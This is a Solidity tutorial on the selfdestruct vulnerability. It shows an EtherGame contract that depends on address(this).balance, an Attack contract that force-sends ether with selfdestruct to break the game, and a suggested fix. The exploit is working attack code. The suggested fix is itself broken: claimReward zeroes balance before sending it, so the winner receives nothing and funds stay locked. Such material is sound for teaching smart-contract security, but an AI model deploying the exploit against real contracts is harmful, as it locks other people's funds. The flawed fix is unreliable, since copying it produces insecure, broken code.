# Self Destruct
From https://solidity-by-example.org/hacks/self-destruct/

The `selfdestruct` operation in Solidity is a special function that allows a contract to be deleted from the blockchain. This creates a significant vulnerability because:

- It forcibly sends all contract balance to a designated address
- The receiving contract cannot reject these funds
- This forced transfer can break contract invariants that rely on balance checks
- Once a contract is self-destructed, all its code and storage is removed from the blockchain

## Why is this dangerous?

In smart contracts that rely on precise balance checks, `selfdestruct` can be used to forcibly send ETH and manipulate the contract's balance. This is particularly dangerous because:
1. The receiving contract has no way to prevent the incoming ETH
2. Balance checks using `address(this).balance` become unreliable
3. Game mechanics or financial logic can be broken by unexpected balance changes

## Example

### Vulnerable Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

contract EtherGame {
    uint256 public constant TARGET_AMOUNT = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint256 balance = address(this).balance;
        require(balance <= TARGET_AMOUNT, "Game is over");

        if (balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
```

### Exploit Code
```solidity
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
```

The attack works as follows:
1. Players start depositing 1 ETH each into the game normally
2. Before the 7th player deposits, an attacker deploys the Attack contract
3. The attacker sends ETH to the Attack contract and calls `attack()`
4. `selfdestruct` forces ETH into the game contract, pushing its balance over 7 ETH
5. The game is now broken because:
   - No more deposits can be made (`balance <= TARGET_AMOUNT` check fails)
   - No one can become the winner (balance will never exactly equal TARGET_AMOUNT)
   - Any ETH already in the contract becomes permanently locked

## Preventative Techniques
Don't rely on address(this).balance
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract EtherGame {
    uint256 public constant TARGET_AMOUNT = 7 ether;
    uint256 public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= TARGET_AMOUNT, "Game is over");

        if (balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        balance = 0;
        (bool sent,) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
```